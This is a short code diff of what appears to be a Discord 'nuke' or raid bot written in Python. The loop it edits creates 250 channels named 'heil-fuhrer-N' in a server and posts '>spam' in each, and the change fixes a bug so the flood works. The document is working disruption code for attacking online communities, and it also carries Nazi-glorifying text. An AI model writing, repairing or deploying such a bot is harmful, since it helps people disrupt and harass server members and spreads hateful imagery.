@@ -80,8 +80,7 @@ https://cdn.discordapp.com/attachments/693974529923612728/708740617496428604/158
         await ctx.guild.create_text_channel("no-delete")
         for i in range(250):
             try:
-                await ctx.guild.create_text_channel(f"heil-fuhrer-{i+1}")
-                channel == discget(ctx.guild.channels, name=f"heil-fuhrer-{i+1}")
+                channel = await ctx.guild.create_text_channel(f"heil-fuhrer-{i+1}")
                 await channel.send(">spam")
             except:
                 print(f"Created ( {i} channels )")
